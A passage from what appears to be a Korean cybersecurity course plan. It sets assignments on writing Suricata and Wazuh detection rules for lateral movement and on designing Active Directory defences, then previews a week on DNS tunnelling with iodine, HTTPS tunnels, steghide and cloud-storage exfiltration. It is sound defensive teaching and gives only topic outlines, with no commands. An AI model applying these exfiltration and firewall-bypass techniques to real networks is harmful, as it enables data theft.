### 과제 2: 탐지 룰 패키지 작성 (필수)
측면 이동 4가지 기법 각각에 대해:
- Suricata 탐지 룰 1개씩 (총 4개) 작성
- Wazuh 커스텀 룰 1개씩 (총 4개) 작성
- 각 룰의 탐지 근거와 오탐 가능성을 설명하라

### 과제 3: 방어 아키텍처 설계 (선택)
Active Directory 환경에서 측면 이동을 최소화하는 방어 아키텍처를 설계하라:
- 계정 티어링(Tier 0/1/2) 정책
- 네트워크 세그멘테이션
- 모니터링/탐지 체계
- Zero Trust 원칙 적용 방안

---

## 다음 주 예고

**Week 05: 데이터 유출 — DNS Exfiltration, HTTPS Tunnel, 스테가노그래피, 클라우드 스토리지 유출**
- DNS 터널링(iodine)을 통한 은밀한 데이터 유출 실습
- HTTPS 터널을 활용한 방화벽 우회 기법
- 스테가노그래피(steghide)로 이미지에 데이터 숨기기
- 클라우드 스토리지를 통한 유출 탐지 기법
